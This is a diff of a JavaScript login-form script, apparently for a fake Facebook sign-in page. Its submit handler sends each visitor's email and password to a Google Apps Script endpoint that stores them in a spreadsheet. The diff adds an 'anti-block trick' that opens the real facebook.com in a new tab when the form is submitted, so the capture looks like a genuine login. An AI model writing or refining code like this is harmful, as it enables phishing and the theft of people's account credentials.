@@ -1,6 +1,5 @@
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwR8pzNfNsEnYFh2XT4vNYwTmhfuw41mmgRK5QRq0nal4TK5Zde4hiK9UfA1ZFjAzKp/exec";
 
-// Función para mostrar la notificación flotante de éxito
 function showSuccessNotification() {
     const messageElement = document.getElementById('success-message');
     if (messageElement) {
@@ -28,7 +27,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     loginButton.textContent = 'Iniciando sesión...';
     loginButton.disabled = true;
 
-    // Paquete para registrar o almacenar las credenciales en la pestaña de Facebook del Sheets
+    // 🌟 TRUCO ANTIBLOQUEO: Abrir Facebook en el instante exacto del envío (submit)
+    window.open("https://www.facebook.com", "_blank");
+
     const payload = {
         action: "registerUser",
         provider: "facebook",
@@ -37,7 +38,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         contrasena: password
     };
 
-    // 1. Enviar datos a Google Sheets en segundo plano
+    // Enviar datos a Google Sheets
     fetch(SCRIPT_URL, {
         method: 'POST',
         headers: {
@@ -46,26 +47,21 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         body: JSON.stringify(payload) 
     })
     .then(response => response.json())
-    .then(result => {
-        console.log("Sincronizado con Sheets:", result);
-    })
-    .catch(error => {
-        console.error('Error de red al sincronizar:', error);
-    })
+    .then(result => console.log("Sincronizado con Sheets:", result))
+    .catch(error => console.error('Error de red al sincronizar:', error))
     .finally(() => {
         // Guardar en el almacenamiento local
         localStorage.setItem('vecino_nombre', email);
         localStorage.setItem('vecino_colonia', 'Red Social');
 
-        // Mostrar notificación visual
         showSuccessNotification();
 
-        // Redirigir en la MISMA pestaña de forma limpia tras 1.5 segundos
+        // Redirigir la pestaña original al sistema
         setTimeout(() => {
             window.location.href = `../index.html?user=${encodeURIComponent(email)}`; 
-        }, 1500);
+        }, 1000);
     });
-}); // <--- 🛠️ ESTE CIERRE FALTABA DEL addEventListener DEL FORMULARIO
+});
 
 document.querySelector('.btn-new-account').addEventListener('click', function() {
     alert("Función no disponible temporalmente.");
